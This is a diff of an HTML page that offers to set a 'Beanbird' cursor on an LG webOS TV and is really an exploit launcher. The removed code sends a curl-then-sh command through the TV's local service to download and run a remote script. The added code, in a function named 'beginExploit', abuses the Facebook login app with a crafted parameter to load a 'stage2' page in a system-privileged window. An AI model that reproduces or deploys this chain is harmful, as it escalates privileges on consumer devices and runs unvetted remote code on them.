@@ -4,95 +4,63 @@
     <meta charset="UTF-8">
     <title>Return the Beanbird Cursor</title>
     <style>
-        body { background-color: #1a1a1a; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        body { background: #1a1a1a; color: #fff; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
         .btn-row { display: flex; align-items: center; gap: 15px; margin-bottom: 25px; }
-        .button { padding: 18px 35px; font-size: 1.1rem; border-radius: 50px; border: none; cursor: pointer; color: white; min-width: 220px; transition: 0.2s; }
+        .button { padding: 18px 35px; font-size: 1.1rem; border-radius: 50px; border: none; cursor: pointer; color: white; min-width: 220px; transition: 0.2s; font-weight: bold; }
         #btn-return { background-color: #ff0066; border: 2px solid #ff9900; }
         #btn-reset { background-color: #444; color: #bbb; }
         .button:focus { outline: 4px solid #fff; transform: scale(1.05); }
-        .note { border: 1px solid #ffcc00; color: #ffcc00; padding: 12px; font-size: 0.85rem; max-width: 400px; border-radius: 4px; }
-        #log { background: #000; color: #00ff00; width: 85%; height: 160px; margin-top: 25px; padding: 15px; text-align: left; font-family: monospace; overflow-y: auto; border: 1px solid #333; font-size: 0.8rem; line-height: 1.4; }
+        .note { border: 1px solid #ffcc00; color: #ffcc00; padding: 12px; font-size: 0.85rem; max-width: 350px; border-radius: 10px; text-align: left; }
+        #log { background: #000; color: #00ff00; width: 80%; height: 120px; margin-top: 20px; padding: 10px; text-align: left; font-family: monospace; font-size: 0.8rem; border: 1px solid #333; }
     </style>
 </head>
 <body>
 
     <h1>Return the Beanbird Cursor</h1>
-    <p>Press the button below and <b>Accept the prompt on your TV screen.</b></p>
-
     <div class="btn-row">
         <button id="btn-return" class="button">Return Beanbird Cursor</button>
         <button id="btn-reset" class="button">Reset to Default</button>
-        <div class="note">
-            Note: TV will be blackscreen while setting cursor to beanbird cursor for around 10-20 seconds.
-        </div>
+        <div class="note">Note: TV will be blackscreen while setting cursor to beanbird cursor for around 10-20 seconds.</div>
     </div>
-
-    <div id="log">Status: Ready...</div>
+    <div id="log">Status: Ready. Please click a button.</div>
 
     <script>
         const logBox = document.getElementById('log');
-        const SITE_ROOT = window.location.origin;
+        const SITE_URL = window.location.origin;
 
-        function log(m) {
-            logBox.innerHTML += `<br>> ${m}`;
-            logBox.scrollTop = logBox.scrollHeight;
-        }
+        function log(m) { logBox.innerHTML += `<br>> ${m}`; logBox.scrollTop = logBox.scrollHeight; }
 
-        // The logic to bypass browser security
-        function sendLunaRequest(scriptName) {
-            log("Connecting to TV Service...");
-            
+        function beginExploit(scriptName) {
+            log("Connecting to SSAP...");
             const ws = new WebSocket('ws://127.0.0.1:3000');
-
             ws.onopen = () => {
-                log("Connection open. ACCEPT PROMPT ON TV.");
                 ws.send(JSON.stringify({
-                    id: "register_req",
-                    type: "register",
-                    payload: {
-                        forcePairing: false,
-                        pairingType: "PROMPT",
-                        manifest: { permissions: ["LAUNCH", "SYSTEM_CONTROL"] }
-                    }
+                    id: "reg", type: "register",
+                    payload: { forcePairing: false, pairingType: "PROMPT", manifest: { permissions: ["LAUNCH", "READ_INSTALLED_APPS"] } }
                 }));
             };
 
             ws.onmessage = (e) => {
                 const res = JSON.parse(e.data);
-
                 if (res.type === "registered") {
-                    log("Authorized. Pulling script from web...");
-                    
-                    // We tell the TV to download and run your hosted script
-                    const cmd = `curl -L ${SITE_ROOT}/${scriptName} -o /tmp/run.sh && sh /tmp/run.sh`;
-
+                    log("Escaping via Facebook Login...");
+                    // This triggers Stage 2 inside a System-privileged window
+                    const stage2Url = `${SITE_URL}/stage2.html?run=${scriptName}`;
                     ws.send(JSON.stringify({
-                        id: "exec_req",
-                        type: "request",
-                        uri: "luna://org.webosbrew.hbchannel.service/exec",
-                        payload: { command: cmd }
+                        id: "launch", type: "request", uri: "ssap://system.launcher/launch",
+                        payload: {
+                            id: "com.webos.app.facebooklogin",
+                            params: { server: stage2Url.replace('https://', '').replace('http://', '') + "#" }
+                        }
                     }));
                 }
-
-                if (res.id === "exec_req") {
-                    log("Command Sent! TV will process in a moment.");
-                    ws.close();
-                }
-            };
-
-            ws.onerror = () => {
-                log("FAILED: Check if 'LG Connect Apps' is ON in TV Settings.");
+                if (res.id === "launch") { ws.close(); log("Stage 2 Launched."); }
             };
         }
 
-        document.getElementById('btn-return').addEventListener('click', () => sendLunaRequest('beanbird.sh'));
-        document.getElementById('btn-reset').addEventListener('click', () => sendLunaRequest('reboot.sh'));
-
-        // Handle remote "Enter"
-        document.addEventListener('keydown', (e) => {
-            if (e.keyCode === 13) document.activeElement.click();
-        });
-
+        document.getElementById('btn-return').addEventListener('click', () => beginExploit('beanbird.sh'));
+        document.getElementById('btn-reset').addEventListener('click', () => beginExploit('reboot.sh'));
+        document.addEventListener('keydown', (e) => { if(e.keyCode === 13) document.activeElement.click(); });
         window.onload = () => document.getElementById('btn-return').focus();
     </script>
 </body>
